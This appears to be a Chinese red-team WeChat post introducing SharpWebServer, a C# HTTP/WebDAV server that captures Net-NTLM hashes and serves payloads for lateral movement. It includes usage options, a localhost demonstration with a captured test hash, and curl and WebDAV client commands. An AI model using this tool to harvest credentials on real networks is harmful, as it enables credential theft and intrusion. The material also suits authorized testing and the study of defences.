#  SharpWebServer—抓取NTLM哈希

[ 夜组安全 ](javascript:void\(0\);)

**夜组安全** ![]()

微信号 NightCrawler_Team

功能介绍 "恐惧就是貌似真实的伪证" NightCrawler Team(简称:夜组)主攻WEB安全 | 内网渗透 | 红蓝对抗 | 代码审计 |
APT攻击，致力于将每一位藏在暗处的白帽子聚集在一起，在夜空中划出一道绚丽的光线！

____

___发表于_

收录于合集 #安全工具 53个

免责声明

由于传播、利用本公众号夜组安全所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号夜组安全及作者不为此承担任何责任，一旦造成后果请自行承担！如有侵权烦请告知，我们会立即删除并致歉。谢谢！

朋友们现在只对常读和星标的公众号才展示大图推送，建议大家把 **夜组安全** “ **设为星标** ”，否则可能就看不到了啦！

![](https://gitee.com/fuli009/images/raw/master/public/20230714145050.png)![](https://gitee.com/fuli009/images/raw/master/public/20230714145050.png)

 **域渗透**

![](https://gitee.com/fuli009/images/raw/master/public/20230714145050.png)![](https://gitee.com/fuli009/images/raw/master/public/20230714145050.png)

 **01**

 **工具介绍**

这是一个基于C#编写的面向Red Team的简易HTTP和WebDAV服务器，具有捕获Net-
NTLM哈希的功能。它可以用于在受感染的计算机上提供载荷以进行横向移动。

  

需要.NET Framework 4.5以及System.Net和System.Net.Sockets环境。

 **02**

 **工具使用**

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
        :: SharpWebServer ::    a Red Team oriented C# Simple HTTP Server with Net-NTLMv1/2 hashes capture functionality  
    Authors:    - Can Güney Aksakalli (github.com/aksakalli)          - original implementation    - harrypatrick442 (github.com/harrypatrick442)        - aksakalli's fork & changes    - Dominic Chell (@domchell) from MDSec                - Net-NTLMv2 hashes capture code borrowed from Farmer    - Mariusz Banach / mgeeky, <mb [at] binary-offensive.com> - combined all building blocks together,                                                            added connection keep-alive to NTLM Authentication  
    Usage:    SharpWebServer.exe <port=port> [dir=path] [verbose=true] [ntlm=true] [redir=true] [logfile=path]  
    Options:    port    - TCP Port number on which to listen (1-65535)    dir     - Directory with files to be hosted.    verbose - Turn verbose mode on.    seconds - Specifies how long should the server be running. Default: indefinitely    ntlm    - Require NTLM Authentication before serving files. Useful to collect NetNTLM hashes              (in MDSec's Farmer style)    redir   - Redirect after NTLM authentication based on redir paramerer in the url (e.g. ?redir=https://example.com)    logfile - Path to output logfile.  
    

  
 **使用案例**  
  
同时提供文件并捕获Net-NTLM哈希的情况下 **Server**  

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     C:\> SharpWebServer.exe port=8888 dir=C:\Windows\Temp verbose=true ntlm=true  
        :: SharpWebServer ::    a Red Team oriented C# Simple HTTP & WebDAV Server with Net-NTLM hashes capture functionality  
    [.] Serving HTTP server on port  : 8888[.] Will run for this long       : 60 seconds[.] Verbose mode turned on.[.] NTLM mode turned on.[.] Serving files from directory : C:\Windows\Temp  
    SharpWebServer [29.03.21, 17:55:14] NTLM: Sending 401 Unauthorized due to lack of Authorization header.SharpWebServer [29.03.21, 17:55:14] ::1 - "GET /test.txt" - len: 0 (401)SharpWebServer [29.03.21, 17:55:14] NTLM: Sending 401 Unauthorized with NTLM Challenge Response.SharpWebServer [29.03.21, 17:55:14] ::1 - "GET /test.txt" - len: 0 (401)  
    [+] SharpWebServer: Net-NTLM hash captured:TestUser:::1122334455667788:66303EE2DF9417E2FE07E1B7FD663205:010100000000000092EC04E8B324D701C2B561D5FECBB325000000000200060053004D0042000100160053004D0042002D0054004F004F004C004B00490054000400120073006D0062002E006C006F00630061006C000300280073006500720076006500720032003000300033002E0073006D0062002E006C006F00630061006C000500120073006D0062002E006C006F00630061006C00080030003000000000000000010000000020000045E18A336DA58F5F0F826F846C699F77DCCF02BA5135525AC52EFBB0C0A1F1160A0010000000000000000000000000000000000009001C0048005400540050002F006C006F00630061006C0068006F00730074000000000000000000  
    SharpWebServer [29.03.21, 17:55:14] ::1 - "GET /test.txt" - len: 11 (200)

 **Client**

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
     C:\> curl -sD- http://localhost:8888/test.txt --ntlm --negotiate -u TestUser:TestPasswordHTTP/1.1 401 UnauthorizedTransfer-Encoding: chunkedWWW-Authenticate: NTLMDate: Mon, 29 Mar 2021 15:55:14 GMT  
    HTTP/1.1 401 UnauthorizedTransfer-Encoding: chunkedWWW-Authenticate: NTLM TlRMTVNTUAACAAAABgAGADgAAAAFAomiESIzRFVmd4gAAAAAAAAAAIAAgAA+AAAABQLODgAAAA9TAE0AQgACAAYAUwBNAEIAAQAWAFMATQBCAC0AVABPAE8ATABLAEkAVAAEABIAcwBtAGIALgBsAG8AYwBhAGwAAwAoAHMAZQByAHYAZQByADIAMAAwADMALgBzAG0AYgAuAGwAbwBjAGEAbAAFABIAcwBtAGIALgBsAG8AYwBhAGwAAAAAAA==Date: Mon, 29 Mar 2021 15:55:14 GMT  
    HTTP/1.1 200 OKContent-Length: 6Content-Type: text/plainDate: Mon, 29 Mar 2021 15:55:14 GMT  
    foobar

  
 **WebDAV client** **  
**

  *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   *   * 

    
    
    C: \> dir \\localhost@8888\test Volume in drive \\localhost@8888\test has no label. Volume Serial Number is 0000-0000  
     Directory of \\localhost@8888\test  
    30.03.2021  05:12    <DIR>          .30.03.2021  05:12    <DIR>          ..30.03.2021  04:27                11 test2.txt30.03.2021  05:12                12 test3.txt30.03.2021  05:12    <DIR>          test4               2 File(s)             23 bytes               3 Dir(s)  225 268 776 960 bytes free  
    C:\> type \\localhost@8888\test\test4\test5.txtHello world!  
    C:\> copy \\localhost@8888\test\test4\test5.txt .        1 file(s) copied.

 **03**

 **工具下载**

 **点击关注下方名片** **进入公众号**

 **回复关键字【 230714** **】获取** **下载链接**

  

 **04**

 **往期精彩**

[ ![](https://gitee.com/fuli009/images/raw/master/public/20230714145107.png)

一个终身免费的安全武器库

](http://mp.weixin.qq.com/s?__biz=Mzk0ODM0NDIxNQ==&mid=2247487269&idx=1&sn=58a73b9c68cc3e50db835b23c7a27e1a&chksm=c3684bddf41fc2cb8e9355095e181e797522178ae96b99ebd81c6b998406ff7a1bda9d1db334&scene=21#wechat_redirect)  
[ ![](https://gitee.com/fuli009/images/raw/master/public/20230714145108.png)

内网探测工具

](http://mp.weixin.qq.com/s?__biz=Mzk0ODM0NDIxNQ==&mid=2247487399&idx=1&sn=9849af6acb107c1176e30b056316637d&chksm=c3684b5ff41fc2498fc9a78a897803b5c6c6161942f66c4bf93deb838e2b35c35824c078e2d0&scene=21#wechat_redirect)  
[ ![](https://gitee.com/fuli009/images/raw/master/public/20230714145109.png)

集成化的渗透工具箱

](http://mp.weixin.qq.com/s?__biz=Mzk0ODM0NDIxNQ==&mid=2247487398&idx=1&sn=f077c6e0550d9d295588a592bf727cea&chksm=c3684b5ef41fc248c6db8b0cb7e8bd719f5d73a56a1b762f9a74ac74c06a0d63ad2e465860e7&scene=21#wechat_redirect)
![]()  

预览时标签不可点

微信扫一扫  
关注该公众号

[知道了](javascript:;)

微信扫一扫  
使用小程序

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

****

[取消](javascript:void\(0\);) [允许](javascript:void\(0\);)

： ， 。   视频 小程序 赞 ，轻点两下取消赞 在看 ，轻点两下取消在看

